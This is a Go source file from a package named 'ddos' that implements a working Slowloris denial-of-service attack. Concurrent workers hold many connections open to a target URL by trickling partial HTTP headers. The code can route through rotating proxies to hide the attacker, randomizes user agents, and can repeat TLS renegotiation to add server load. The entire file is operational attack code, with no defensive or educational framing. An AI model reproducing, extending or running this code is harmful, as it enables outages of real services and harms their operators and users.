package ddos

import (
	"crypto/tls"
	"fmt"
	"net"
	"sync/atomic"
	"time"
)

// startSlowlorisAttack starts Slowloris attack
func (d *DDoSAttack) startSlowlorisAttack() {
	d.startSlowlorisWorkers(d.config.MaxThreads)
}

// startSlowlorisWorkers starts specified number of slowloris workers
func (d *DDoSAttack) startSlowlorisWorkers(numWorkers int) {
	for i := 0; i < numWorkers; i++ {
		d.wg.Add(1)
		go d.slowlorisWorker()
	}
}

// slowlorisWorker is a single Slowloris worker
func (d *DDoSAttack) slowlorisWorker() {
	defer d.wg.Done()

	for {
		select {
		case <-d.ctx.Done():
			return
		default:
			d.slowlorisConnection()
		}
	}
}

// slowlorisConnection creates and maintains a single slowloris connection
func (d *DDoSAttack) slowlorisConnection() {
	atomic.AddInt64(&d.activeConns, 1)
	defer atomic.AddInt64(&d.activeConns, -1)

	// Determine if we should use TLS and get the correct URL
	useTLS, _, targetURL := d.shouldUseTLS(d.config.TargetURL)
	host, port, path := d.parseTargetURL(targetURL, useTLS)

	// Connect
	var conn net.Conn
	var err error
	var tlsConn *tls.Conn
	var usedProxy string

	dialer := &net.Dialer{
		Timeout: d.config.Timeout,
	}

	// Proxy support for Slowloris attack
	if d.config.UseProxy {
		// Rotate proxies if enabled
		if d.config.RotateProxy {
			if proxyURL, ok := d.getNextProxy(); ok {
				usedProxy = proxyURL
				conn, err = d.dialThroughHTTPProxy(dialer, proxyURL, host, port, useTLS)
			}
		} else if len(d.proxies) > 0 {
			// Single-proxy mode: always use the first proxy
			proxyURL := d.proxies[0]
			usedProxy = proxyURL
			conn, err = d.dialThroughHTTPProxy(dialer, proxyURL, host, port, useTLS)
		}
	}

	// Fallback to direct connection if no proxy was used
	if conn == nil && err == nil {
		if useTLS {
			tlsConfig := d.createTLSConfig()
			tlsConn, err = tls.DialWithDialer(dialer, "tcp", host+":"+port, tlsConfig)
			if err == nil {
				conn = tlsConn
			}
		} else {
			conn, err = dialer.Dial("tcp", host+":"+port)
		}
	}

	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		if usedProxy != "" {
			d.markProxyFailure(usedProxy)
		}
		return
	}

	// If connection is TLS via proxy, keep a reference for renegotiation
	if tlsConn == nil {
		if tc, ok := conn.(*tls.Conn); ok {
			tlsConn = tc
		}
	}
	defer conn.Close()

	// Successful connection via proxy – mark it healthy
	if usedProxy != "" {
		d.markProxySuccess(usedProxy)
	}

	atomic.AddInt64(&d.requestsSent, 1)

	// Send initial partial HTTP request
	initialHeaders := fmt.Sprintf("%s %s HTTP/1.1\r\n", d.config.Method, path)
	initialHeaders += fmt.Sprintf("Host: %s\r\n", host)
	initialHeaders += fmt.Sprintf("User-Agent: %s\r\n", d.getRandomUserAgent())
	initialHeaders += "Accept: */*\r\n"
	initialHeaders += "Accept-Language: en-US,en;q=0.9\r\n"

	_, err = conn.Write([]byte(initialHeaders))
	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		return
	}
	atomic.AddInt64(&d.bytesSent, int64(len(initialHeaders)))

	// Keep connection alive by sending partial headers periodically
	ticker := time.NewTicker(d.config.SlowlorisDelay)
	defer ticker.Stop()

	headerCount := 0
	renegotiationTicker := time.NewTicker(5 * time.Second) // Renegotiate every 5 seconds if enabled
	defer renegotiationTicker.Stop()

	for {
		select {
		case <-d.ctx.Done():
			return
		case <-ticker.C:
			// Send a partial header to keep connection open
			partialHeader := fmt.Sprintf("X-Custom-%d: %d\r\n", headerCount, time.Now().UnixNano())
			_, err := conn.Write([]byte(partialHeader))
			if err != nil {
				// Connection closed, try again
				if usedProxy != "" {
					d.markProxyFailure(usedProxy)
				}
				return
			}
			atomic.AddInt64(&d.bytesSent, int64(len(partialHeader)))
			atomic.AddInt64(&d.requestsSuccess, 1)
			headerCount++
		case <-renegotiationTicker.C:
			// Perform TLS renegotiation if enabled
			if d.config.UseTLSAttack && d.config.TLSRenegotiation && tlsConn != nil {
				if err := d.performTLSRenegotiation(tlsConn); err != nil {
					// Renegotiation failed, connection may be closed
					return
				}
				atomic.AddInt64(&d.bytesSent, 512) // Approximate renegotiation overhead
			}
		}
	}
}

